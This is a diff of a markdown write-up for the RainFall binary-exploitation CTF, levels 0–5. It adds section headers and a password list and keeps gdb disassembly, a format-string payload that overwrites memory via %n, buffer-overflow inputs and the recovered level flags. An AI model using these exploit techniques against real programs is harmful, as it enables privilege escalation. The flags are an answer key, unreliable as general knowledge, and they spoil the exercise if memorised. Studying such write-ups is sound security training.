@@ -21,6 +21,10 @@ The user/password to log for the 1st level will be `level0`/`level0`
 
 ## Level0
 
+- [objdump -d output]()
+
+### ASM Interpretation
+
 ```asm
 (gdb) disas main
 Dump of assembler code for function main:
@@ -76,6 +80,10 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
+### Equivalent C source code
+
+### Walkthrough
+
 ```bash
 level0@RainFall:~$ ./level0
 Segmentation fault (core dumped)
@@ -116,6 +124,13 @@ level1@RainFall:/home/user/level1$ cat .pass
 ## Level1
 
 - [`objdump -d` output](http://ix.io/2bqM)
+
+### ASM Interpretation
+
+### Equivalent C source code
+
+### Walkthrough
+
 - [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)
 
 ```bash
@@ -203,7 +218,7 @@ $ whoami
 level1
 ```
 
-## Overwriting $EIP
+#### Overwriting $EIP
 
 - [Example tutorial](https://www.go4expert.com/articles/stack-overflow-eip-overwrite-basics-t24917/)
 
@@ -272,6 +287,8 @@ Some image of what we're doing here, replace `strcpy()` by `gets()`
 
 - [`objdump -d` output]()
 
+### ASM Interpretation
+
 ```bash
 gdb-peda$ disas main
 Dump of assembler code for function main:
@@ -323,6 +340,10 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
+### Equivalent C source code
+
+
+### Walkthrough
 As we can see we're storing the output of gets() in to pointer to the 28h byte of the stack, which has a size limited to 104 bytes
 
 It's also important to note that we're executing printf("%p") instead of puts() & strdup() when the 92th byte of the stack is between 0xb0 and 0xbf
@@ -436,6 +457,8 @@ cat /home/user/level3/.pass
 
 - [`objdump -d` output](http://ix.io/2bMn)
 
+### ASM Interpretation
+
 ```bash
 gdb-peda$ disas main
 Dump of assembler code for function main:
@@ -496,7 +519,7 @@ Dump of assembler code for function stdout@@GLIBC_2.0:
 End of assembler dump.
 ```
 
-Equivalent C code:
+### Equivalent C source code
 
 ```cpp
 // level3@RainFall:~$ cat /tmp/lol.c
@@ -522,6 +545,8 @@ int     main(void) {
         return (0);
 }
 ```
+
+### Walkthrough
 
 ```bash
 level3@RainFall:~$ ./level3
@@ -556,7 +581,7 @@ Segmentation fault (core dumped)
 
 We can read our own string !
 
-### Overwriting m
+#### Overwriting m
 
 ```bash
 (gdb) info variables
@@ -617,7 +642,7 @@ cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
 
-### Rewriting EIP attempt
+#### Rewriting EIP attempt
 
 ```bash
 level3@RainFall:~$ python -c "print 'A'*4" > /tmp/input; cat /tmp/input
@@ -892,7 +917,7 @@ Dump of assembler code for function p:
 End of assembler dump.
 ```
 
-### Equivalent C Code
+### Equivalent C source code
 
 ```c
 #include <stdio.h>
@@ -964,6 +989,16 @@ echo -n -e '\x10\x98\x04\x08%16930112x%12$n' >  /tmp/lol ; cat /tmp/lol - | ./le
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
+## Level5
+
+- [`objdump -d` output]()
+
+### ASM Interpretation
+
+### Equivalent C source code
+
+### Walktrough
+
 ## Misc / References
 
 ### ASM Cheatsheets
@@ -1033,6 +1068,10 @@ end:x:2014:2014::/home/user/end:/bin/bash
 ### Passwords
 
 ```bash
+level0 -> level0
+level1 -> 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+level2 -> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+level3 -> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
